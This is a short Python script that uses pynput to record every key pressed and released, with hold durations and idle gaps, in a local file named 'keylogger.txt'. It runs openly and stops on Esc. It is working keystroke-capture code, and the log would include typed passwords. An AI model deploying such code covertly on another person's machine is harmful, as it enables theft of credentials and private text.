import pynput
import time

pressed_duration = {}
key_pressed = {}
idle_duration = 0

def on_press(key):
    global pressed_duration, key_pressed
    if key == pynput.keyboard.Key.esc:
        return False
    if key in key_pressed:
        return
    if key_pressed == {}:
        end_idle_timer()

    key_pressed[key] = key
    pressed_duration[key] = float("{:0.2f}".format(time.time()))

    with open("keylogger.txt", "a") as f:
        f.write(f"START {key}\n")

def on_release(key):
    global pressed_duration, key_pressed, idle_duration
    if key not in key_pressed:
        return
    
    pressed_duration[key] = float("{:0.2f}".format(time.time() - pressed_duration[key]))
    with open("keylogger.txt", "a") as f:
        f.write(f"END {key} {pressed_duration[key]}\n")

    del key_pressed[key]
    for k in key_pressed:
        pressed_duration[k] = float("{:0.2f}".format(time.time()))

    if key_pressed == {}:
        start_idle_timer()

def start_idle_timer():
    global idle_duration
    idle_duration = time.time()

def end_idle_timer():
    global idle_duration
    idle_time = float("{:0.2f}".format(time.time() - idle_duration))
    with open("keylogger.txt", "a") as f:
        f.write(f"IDLE {idle_time}\n")

def run():
    time.sleep(3)
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        print("keylogger.py is listening")
        start_idle_timer()
        listener.join()

if __name__ == "__main__":
    run()